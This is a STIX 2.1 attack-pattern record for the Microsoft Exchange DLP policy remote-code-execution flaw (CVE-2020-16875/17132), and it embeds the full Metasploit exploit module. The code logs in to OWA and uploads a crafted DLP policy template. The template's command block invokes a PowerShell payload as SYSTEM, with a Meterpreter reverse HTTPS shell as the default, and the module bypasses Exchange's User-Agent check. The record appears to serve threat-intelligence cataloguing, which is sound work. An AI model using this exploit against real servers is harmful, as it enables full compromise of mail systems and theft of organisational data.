{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--336c231f-5186-4344-8b5d-649574c05c1c",
    "created": "2024-08-14T16:53:19.927629Z",
    "modified": "2024-08-14T16:53:19.927633Z",
    "name": "Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE",
    "description": " This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exchange Server. Authentication is required to exploit this vulnerability. Additionally, the target user must have the \"Data Loss Prevention\" role assigned and an active mailbox.  If the user is in the \"Compliance Management\" or greater \"Organization Management\" role groups, then they have the \"Data Loss Prevention\" role. Since the user who installed Exchange is in the \"Organization Management\" role group, they transitively have the \"Data Loss Prevention\" role.  The specific flaw exists within the processing of the New-DlpPolicy cmdlet. The issue results from the lack of proper validation of user-supplied template data when creating a DLP policy. An attacker can leverage this vulnerability to execute code in the context of SYSTEM.  Tested against Exchange Server 2016 CU19 on Windows Server 2016. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/exchange_ecp_dlp_policy.rb",
            "external_id": "exchange_ecp_dlp_policy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-16875"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-17132"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875"
        },
        {
            "source_name": "reference",
            "url": "https://support.microsoft.com/en-us/help/4577352/security-update-for-exchange-server-2019-and-2016"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2020-0019/"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/cve-2020-16875.py.txt"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/cve-2020-16875.ps1.txt"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE',\n        'Description' => %q{\n          This vulnerability allows remote attackers to execute arbitrary code\n          on affected installations of Exchange Server. Authentication is\n          required to exploit this vulnerability. Additionally, the target user\n          must have the \"Data Loss Prevention\" role assigned and an active\n          mailbox.\n\n          If the user is in the \"Compliance Management\" or greater \"Organization\n          Management\" role groups, then they have the \"Data Loss Prevention\"\n          role. Since the user who installed Exchange is in the \"Organization\n          Management\" role group, they transitively have the \"Data Loss\n          Prevention\" role.\n\n          The specific flaw exists within the processing of the New-DlpPolicy\n          cmdlet. The issue results from the lack of proper validation of\n          user-supplied template data when creating a DLP policy. An attacker\n          can leverage this vulnerability to execute code in the context of\n          SYSTEM.\n\n          Tested against Exchange Server 2016 CU19 on Windows Server 2016.\n        },\n        'Author' => [\n          'Leonard Rapp', # Patch Diffing and Analysis\n          'Markus Vervier', # PoC / Exploitation\n          'Steven Seeley', # (mr_me) for the original PoC and good discussions\n          'Yasar Klawohn', # PoC / Bypass\n          'wvu', # Module\n          'Spencer McIntyre' # Professional coat-tail rider\n        ],\n        'References' => [\n          ['CVE', '2020-16875'],\n          ['CVE', '2020-17132'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875'],\n          ['URL', 'https://support.microsoft.com/en-us/help/4577352/security-update-for-exchange-server-2019-and-2016'],\n          ['URL', 'https://srcincite.io/advisories/src-2020-0019/'],\n          ['URL', 'https://srcincite.io/pocs/cve-2020-16875.py.txt'],\n          ['URL', 'https://srcincite.io/pocs/cve-2020-16875.ps1.txt'],\n          ['URL', 'https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html'],\n          ['URL', 'https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/']\n        ],\n        'DisclosureDate' => '2021-01-12', # Original public disclosure: 2020-09-08, latest patch bypass supported by this module: 2021-01-12\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          ['Exchange Server <= 2016 CU19 and 2019 CU8', {}] # December 2020 updates\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_https',\n          'HttpClientTimeout' => 5,\n          'WfsDelay' => 10\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [\n            IOC_IN_LOGS,\n            ACCOUNT_LOCKOUTS, # Creates a concurrent OWA session\n            CONFIG_CHANGES, # Creates a new DLP policy\n            ARTIFACTS_ON_DISK # Uses a DLP policy template file\n          ]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [false, 'OWA username']),\n      OptString.new('PASSWORD', [false, 'OWA password'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def vuln_builds\n    # https://docs.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019\n    [\n      [Rex::Version.new('15.1.225'), Rex::Version.new('15.1.2176')], # Exchange Server 2016\n      [Rex::Version.new('15.2.196'), Rex::Version.new('15.2.792')] # Exchange Server 2019\n    ]\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/owa/auth/logon.aspx')\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    # Hat tip @tsellers-r7\n    #\n    # <link rel=\"shortcut icon\" href=\"/owa/auth/15.1.2044/themes/resources/favicon.ico\" type=\"image/x-icon\">\n    unless res.code == 200 && %r{/owa/auth/(?<build>[\\d.]+)/} =~ res.body\n      return CheckCode::Unknown('Target does not appear to be running Exchange Server.')\n    end\n\n    if vuln_builds.any? { |build_range| Rex::Version.new(build).between?(*build_range) }\n      return CheckCode::Appears(\"Exchange Server #{build} is a vulnerable build.\")\n    end\n\n    CheckCode::Safe(\"Exchange Server #{build} is not a vulnerable build.\")\n  end\n\n  def exploit\n    owa_login\n    create_dlp_policy(retrieve_viewstate)\n  end\n\n  def owa_login\n    unless username && password\n      fail_with(Failure::BadConfig, 'USERNAME and PASSWORD are required for exploitation')\n    end\n\n    print_status(\"Logging in to OWA with creds #{username}:#{password}\")\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/owa/auth.owa'),\n      'vars_post' => {\n        'username' => username,\n        'password' => password,\n        'flags' => '',\n        'destination' => full_uri('/owa/', vhost_uri: true)\n      },\n      'keep_cookies' => true\n    }, datastore['HttpClientTimeout'], 2) # timeout and redirect_depth\n\n    unless res\n      fail_with(Failure::Unreachable, 'Failed to access OWA login page')\n    end\n\n    unless res.code == 200 && cookie_jar.cookies.any? { |cookie| cookie.name.start_with?('cadata') }\n      if res.body.include?('There are too many active sessions connected to this mailbox.')\n        fail_with(Failure::NoAccess, 'Reached active session limit for mailbox')\n      end\n\n      fail_with(Failure::NoAccess, 'Failed to log in to OWA with supplied creds')\n    end\n\n    if res.body.include?('Choose your preferred display language and home time zone below.')\n      fail_with(Failure::NoAccess, 'Mailbox is active but not fully configured')\n    end\n\n    print_good('Successfully logged in to OWA')\n  end\n\n  def retrieve_viewstate\n    print_status('Retrieving ViewState from DLP policy creation page')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/ecp/DLPPolicy/ManagePolicyFromISV.aspx'),\n      'agent' => '', # HACK: Bypass Exchange's User-Agent validation\n      'keep_cookies' => true\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, 'Failed to access DLP policy creation page')\n    end\n\n    unless res.code == 200 && (viewstate = res.get_html_document.at('//input[@id = \"__VIEWSTATE\"]/@value')&.text)\n      fail_with(Failure::UnexpectedReply, 'Failed to retrieve ViewState')\n    end\n\n    print_good('Successfully retrieved ViewState')\n    viewstate\n  end\n\n  def create_dlp_policy(viewstate)\n    print_status('Creating custom DLP policy from malicious template')\n    vprint_status(\"DLP policy name: #{dlp_policy_name}\")\n\n    form_data = Rex::MIME::Message.new\n    form_data.add_part(viewstate, nil, nil, 'form-data; name=\"__VIEWSTATE\"')\n    form_data.add_part(\n      'ResultPanePlaceHolder_ButtonsPanel_btnNext',\n      nil,\n      nil,\n      'form-data; name=\"ctl00$ResultPanePlaceHolder$senderBtn\"'\n    )\n    form_data.add_part(\n      dlp_policy_name,\n      nil,\n      nil,\n      'form-data; name=\"ctl00$ResultPanePlaceHolder$contentContainer$name\"'\n    )\n    form_data.add_part(\n      dlp_policy_template,\n      'text/xml',\n      nil,\n      %(form-data; name=\"ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl\"; filename=\"#{dlp_policy_filename}\")\n    )\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/ecp/DLPPolicy/ManagePolicyFromISV.aspx'),\n      'agent' => '', # HACK: Bypass Exchange's User-Agent validation\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'data' => form_data.to_s\n    }, 0)\n  end\n\n  def dlp_policy_template\n    # https://docs.microsoft.com/en-us/exchange/developing-dlp-policy-template-files-exchange-2013-help\n    <<~XML\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <dlpPolicyTemplates>\n        <dlpPolicyTemplate id=\"F7C29AEC-A52D-4502-9670-141424A83FAB\" mode=\"Audit\" state=\"Enabled\" version=\"15.0.2.0\">\n          <contentVersion>4</contentVersion>\n          <publisherName>#{Faker::Company.name}</publisherName>\n          <name>\n            <localizedString lang=\"en\">#{dlp_policy_name}</localizedString>\n          </name>\n          <description>\n            <localizedString lang=\"en\">#{Faker::Hacker.say_something_smart}</localizedString>\n          </description>\n          <keywords></keywords>\n          <ruleParameters></ruleParameters>\n          <policyCommands>\n            <commandBlock>\n              <![CDATA[ & \"Invoke-Expression\" \"#{cmd_psh_payload(payload.encoded, payload.arch.first, exec_in_place: true)}\"; New-TransportRule -DlpPolicy ]]>\n            </commandBlock>\n          </policyCommands>\n          <policyCommandsResources></policyCommandsResources>\n        </dlpPolicyTemplate>\n      </dlpPolicyTemplates>\n    XML\n  end\n\n  def dlp_policy_name\n    @dlp_policy_name ||= \"#{Faker::Company.name} Data\"\n  end\n\n  def dlp_policy_filename\n    @dlp_policy_filename ||= \"#{rand_text_alphanumeric(8..42)}.xml\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-01-12, # Original public disclosure: 2020-09-08, latest patch bypass supported by this module: 2021-01-12",
    "x_mitre_platforms": [
        "win'"
    ]
}